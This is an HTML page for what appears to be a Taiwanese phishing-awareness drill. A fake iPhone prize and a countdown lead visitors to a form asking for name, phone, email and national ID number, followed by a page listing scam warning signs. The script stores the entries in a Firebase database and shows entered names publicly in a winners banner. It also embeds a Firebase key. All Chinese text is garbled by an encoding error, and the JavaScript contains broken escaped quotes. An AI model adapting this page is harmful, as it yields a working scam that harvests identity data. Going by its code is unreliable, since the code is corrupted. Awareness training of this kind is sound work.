<!DOCTYPE html>
<html lang="zh-TW">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>ğŸ‰ æ­å–œæ‚¨è¢«é¸ä¸­ï¼ - ç¶²è·¯å®‰å…¨æ•™è‚²æ¼”ç·´</title>
  <script src="https://www.gstatic.com/firebasejs/10.12.0/firebase-app-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/10.12.0/firebase-database-compat.js"></script>
  <style>
    body { font-family: 'Microsoft JhengHei', sans-serif; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: #333; margin: 0; padding: 0; }
    .education-banner { background: #ff4444; color: white; text-align: center; padding: 10px; font-weight: bold; }
    .container { max-width: 800px; margin: 0 auto; padding: 20px; }
    .main-card, .form-container, .warning-page { background: white; border-radius: 20px; padding: 30px; margin: 20px 0; box-shadow: 0 10px 20px rgba(0,0,0,0.1); text-align: center; }
    .title { font-size: 2em; color: #ff6b35; }
    .subtitle { color: #666; margin-bottom: 20px; }
    .phone-image { width: 200px; height: 300px; margin: 20px auto; background: linear-gradient(135deg, #1e3c72, #2a5298); color: white; border-radius: 30px; display: flex; align-items: center; justify-content: center; font-size: 1.2em; }
    .lucky-button { background: #f7931e; color: white; padding: 15px 30px; border: none; border-radius: 50px; font-size: 1.2em; cursor: pointer; margin-top: 20px; }
    .click-counter { margin: 20px 0; font-weight: bold; }
    .marquee-container { background: #333; color: white; padding: 10px; border-radius: 10px; overflow: hidden; }
    .marquee { display: inline-block; white-space: nowrap; animation: scroll 15s linear infinite; }
    @keyframes scroll { 0% { transform: translateX(100%); } 100% { transform: translateX(-100%); } }
    .form-group { margin-bottom: 15px; text-align: left; }
    .form-group label { display: block; margin-bottom: 5px; }
    .form-group input { width: 100%; padding: 10px; border: 1px solid #ccc; border-radius: 8px; }
    .submit-btn, .back-button { width: 100%; padding: 12px; font-size: 1.1em; border: none; border-radius: 8px; margin-top: 10px; color: white; }
    .submit-btn { background: #28a745; }
    .back-button { background: #007bff; }
  </style>
</head>
<body>
  <div class="education-banner">
    âš ï¸ é€™æ˜¯ç¶²è·¯å®‰å…¨æ•™è‚²æ¨¡æ“¬æ¼”ç·´ç¶²ç«™ - è«‹å‹¿è¼¸å…¥çœŸå¯¦å€‹äººè³‡æ–™ âš ï¸
  </div>
  <div class="container">
    <div id="homepage" class="main-card">
      <h1 class="title">ğŸ‰ æ­å–œæ‚¨è¢«é¸ä¸­ï¼</h1>
      <p class="subtitle">æ‚¨æœ‰æ©Ÿæœƒå…è²»ç²å¾—å…¨æ–° iPhone 16 Pro Maxï¼</p>
      <div class="phone-image">ğŸ“±<br>iPhone 16<br>Pro Max</div>
      <p style="color: #ff6b35; font-size: 1.2em;">âš¡ é™æ™‚å„ªæƒ ï¼åƒ…å‰© <span id="timer">05:00</span> åˆ†é˜ï¼</p>
      <button class="lucky-button" onclick="clickLucky()">ğŸ ç«‹å³é»æ“ŠæŠ½çï¼</button>
      <div class="click-counter">å·²æœ‰ <span id="clickCount">0</span> äººåƒèˆ‡æŠ½çï¼</div>
    </div>

    <div class="marquee-container">
      <div class="marquee" id="marqueeText">ğŸ‰ å°šç„¡ä¸­çåå–®ï¼Œå¿«ä¾†è©¦è©¦æ‰‹æ°£ï¼</div>
    </div>

    <div id="formPage" class="form-container" style="display:none;">
      <h2 style="color: #ff6b35;">å¡«å¯«è³‡æ–™å®ŒæˆæŠ½ç</h2>
      <form onsubmit="submitForm(event)">
        <div class="form-group">
          <label for="name">å§“åï¼š</label>
          <input type="text" id="name" required>
        </div>
        <div class="form-group">
          <label for="phone">æ‰‹æ©Ÿè™Ÿç¢¼ï¼š</label>
          <input type="tel" id="phone" required>
        </div>
        <div class="form-group">
          <label for="email">é›»å­éƒµä»¶ï¼š</label>
          <input type="email" id="email" required>
        </div>
        <div class="form-group">
          <label for="idcard">èº«åˆ†è­‰å­—è™Ÿï¼š</label>
          <input type="text" id="idcard" required>
        </div>
        <button type="submit" class="submit-btn">ç¢ºèªé€å‡º</button>
      </form>
    </div>

    <div id="warningPage" class="warning-page" style="display:none;">
      <div style="font-size: 4em; color: #ff4444;">âš ï¸</div>
      <h2 style="color:#ff4444">åœï¼é€™æ˜¯è©é¨™é™·é˜±ï¼</h2>
      <p>æ‚¨å‰›æ‰å·®é»æˆç‚ºç¶²è·¯è©é¨™çš„å—å®³è€…ï¼</p>
      <p><strong>å¸¸è¦‹è©é¨™ç‰¹å¾µï¼š</strong></p>
      <p>â€¢ è²ç¨±æ‚¨ä¸­ç â€¢ è¦æ±‚å¡«å¯«å€‹è³‡ â€¢ é™æ™‚å£“åŠ› â€¢ æ‰¿è«¾ä¸å¯¦çå“</p>
      <p><strong>è¨˜ä½ï¼š</strong>åˆæ³•æŠ½çæ´»å‹•ä¸æœƒè¦æ±‚æ‚¨æä¾›èº«åˆ†è­‰å­—è™Ÿï¼</p>
      <button class="back-button" onclick="goHome()">è¿”å›é¦–é </button>
    </div>
  </div>

  <!-- Firebase CDN -->
<script src="https://www.gstatic.com/firebasejs/10.12.0/firebase-app-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/10.12.0/firebase-database-compat.js"></script>

<script>
  const firebaseConfig = {
    apiKey: "AIzaSyBLGufRiE--W_CJu98AZph9TsRLCHuaxr0",
    authDomain: "fir-fc9d0.firebaseapp.com",
    databaseURL: "https://fir-fc9d0-default-rtdb.firebaseio.com",
    projectId: "fir-fc9d0",
    storageBucket: "fir-fc9d0.appspot.com",
    messagingSenderId: "490554276031",
    appId: "1:490554276031:web:8bc5c2a66b0ed63c1ee0a",
    measurementId: "G-F8SLYQ5LQN"
  };

  firebase.initializeApp(firebaseConfig);
  const db = firebase.database();

  let clickCount = 0;

  function startTimer() {
    let timeLeft = 300;
    const timer = setInterval(() => {
      const m = Math.floor(timeLeft / 60);
      const s = (timeLeft % 60).toString().padStart(2, '0');
      document.getElementById('timer').textContent = `${m}:${s}`;
      if (--timeLeft < 0) clearInterval(timer);
    }, 1000);
  }

  function clickLucky() {
    clickCount++;
    document.getElementById('clickCount').textContent = clickCount;
    document.getElementById('homepage').style.display = 'none';
    document.getElementById('formPage').style.display = 'block';
  }

  function submitForm(event) {
    event.preventDefault();
    const name = document.getElementById('name').value;
    const phone = document.getElementById('phone').value;
    const email = document.getElementById('email').value;
    const idcard = document.getElementById('idcard').value;

    const entryRef = db.ref('entries').push();
    entryRef.set({ name, phone, email, idcard }).then(() => {
      alert(\"âš ï¸ æé†’æ‚¨ï¼šé€™æ˜¯ä¸€å€‹é‡£é­šè©é¨™æ¨¡æ“¬ç¶²ç«™ï¼Œè«‹å‹¿è¼¸å…¥çœŸå¯¦è³‡æ–™ï¼\");
      updateMarquee();
      document.getElementById('formPage').style.display = 'none';
      document.getElementById('warningPage').style.display = 'block';
    }).catch(err => {
      alert(\"æäº¤å¤±æ•—ï¼Œè«‹ç¨å¾Œå†è©¦ï¼\");
      console.error(err);
    });
  }

  function updateMarquee() {
    db.ref('entries').once('value').then(snapshot => {
      const data = snapshot.val();
      const names = Object.values(data || {}).map(d => `${d.name} ä¸­çï¼`).join(' ');
      document.getElementById('marqueeText').textContent = `ğŸ‰ ${names}`;
    });
  }

  function goHome() {
    document.getElementById('warningPage').style.display = 'none';
    document.getElementById('homepage').style.display = 'block';
    document.getElementById('name').value = '';
    document.getElementById('phone').value = '';
    document.getElementById('email').value = '';
    document.getElementById('idcard').value = '';
    updateMarquee();
  }

  window.onload = function () {
    startTimer();
    updateMarquee();
  };

  // ç¶å®šå…¨åŸŸå‡½å¼
  window.clickLucky = clickLucky;
  window.submitForm = submitForm;
  window.goHome = goHome;
</script>

  </script>
</body>
</html>
